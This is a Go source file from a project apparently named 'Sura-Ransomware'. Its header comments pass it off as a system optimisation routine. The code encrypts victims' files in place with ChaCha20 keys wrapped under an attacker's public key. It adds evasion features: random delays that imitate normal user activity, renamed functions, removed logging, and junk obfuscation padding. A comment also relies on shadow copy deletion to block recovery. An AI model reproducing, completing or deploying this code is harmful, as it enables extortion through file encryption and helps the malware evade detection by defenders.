// OBFUSCATED
// System optimization routine
// Windows compatibility layer
package encryption

import (
	Configuration "Sura-Ransomware/configuration"
	cryptorand "crypto/rand"
	"encoding/base64"
	"io"
	"math/rand"
	"os"
	"time"

	eciesgo "github.com/ecies/go"
	"golang.org/x/crypto/chacha20"
)

const (
	sep = "||" // Separator
)

var (
	pk  *eciesgo.PublicKey
	err error
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

func init() {
	pk, err = eciesgo.NewPublicKeyFromHex(Configuration.PublicKey)
	if err != nil {
		panic(err)
	}
	rand.Seed(time.Now().UnixNano())
}

// Obfuscated function names
func genK() ([]byte, error) {
	key := make([]byte, chacha20.KeySize)
	if _, err := cryptorand.Read(key); err != nil {
		return nil, err
	}
	return key, nil
}

func genN() ([]byte, error) {
	nonce := make([]byte, chacha20.NonceSizeX)
	if _, err := cryptorand.Read(nonce); err != nil {
		return nil, err
	}
	return nonce, nil
}

// Simulate normal file operation timing
func simulateUserDelay() {
	if Configuration.SimulateNormalActivity {
		// Random delay between 100ms and 2s to mimic user file operations
		delay := 100 + rand.Intn(1900)
		time.Sleep(time.Duration(delay) * time.Millisecond)
	}
}

// Renamed to be less obvious
func ProcessFile(filePath string) {
	// Add random delay before processing to look like normal activity
	simulateUserDelay()

	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	// NOTE: Secure overwrite is NOT used here because it would make files
	// unrecoverable even with the decryption key. Strong encryption is enough.
	// Shadow copy deletion prevents recovery of unencrypted originals.

	// Generate the key and nonce
	key, err := genK()
	if err != nil {
		return
	}

	nonce, err := genN()
	if err != nil {
		return
	}

	// Encrypt the key and nonce using RSA
	encryptedKey, err := eciesgo.Encrypt(pk, key)
	if err != nil {
		return
	}

	encryptedNonce, err := eciesgo.Encrypt(pk, nonce)
	if err != nil {
		return
	}

	// Create the cipher for ChaCha20 encryption
	cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return
	}

	buffer := make([]byte, Configuration.ChunkSize)

	// Read and encrypt the file content
	var fileContent []byte
	for {
		n, err := file.Read(buffer)
		if err != nil && err != io.EOF {
			return
		}

		if n == 0 {
			break
		}

		fileContent = append(fileContent, buffer[:n]...)
	}

	ciphertext := make([]byte, len(fileContent))
	for i := 0; i < len(fileContent); i += Configuration.EncryptEveryNthByte {
		if i < len(fileContent) {
			cipher.XORKeyStream(ciphertext[i:i+1], fileContent[i:i+1])
		}
		if i+1 < len(fileContent) {
			ciphertext[i+1] = fileContent[i+1]
		}
		if i+2 < len(fileContent) {
			ciphertext[i+2] = fileContent[i+2]
		}
	}

	// Prepare the final data to write to the file
	finalData := append(encryptedKey, sep...)
	finalData = append(finalData, encryptedNonce...)
	finalData = append(finalData, sep...)
	finalData = append(finalData, ciphertext...)

	// Write the final data back to the file
	if err = file.Truncate(0); err != nil {
		return
	}

	if _, err = file.Seek(0, io.SeekStart); err != nil {
		return
	}

	if _, err = file.Write(finalData); err != nil {
		return
	}

	// Removed logging to reduce detection
}



// Obfuscation padding
func obf_35103() {
    _ = 6589
    var _ = "PnlqWNIA1pClUvwL8YrLOGbPuU47TtbV5SbG9b24ISYdVWTOND"
}


// Obfuscation padding
func obf_87465() {
    _ = 8858
    var _ = "ZwcuIQEC9Md8YAArLfqTdZ7X9sS4Zq89kO5nos0JRwGOyTfQJj"
}


// Obfuscation padding
func obf_93281() {
    _ = 1897
    var _ = "zfNv2cuTGLbe8k8VINFJjSrx87PyN8jlFbrvziH5Byh1Dzqgxl"
}


// Obfuscation padding
func obf_19084() {
    _ = 6113
    var _ = "Ur63EqQSUJl8LUsEXQATSwHPRZLXeEf8Jzbhpr20qGSU6R9wVZ"
}


// Obfuscation padding
func obf_55283() {
    _ = 6976
    var _ = "614FCths7ExBZfhtPJz5IOTEa9OXsgT9s9fmOzzsGrU5yMqgac"
}
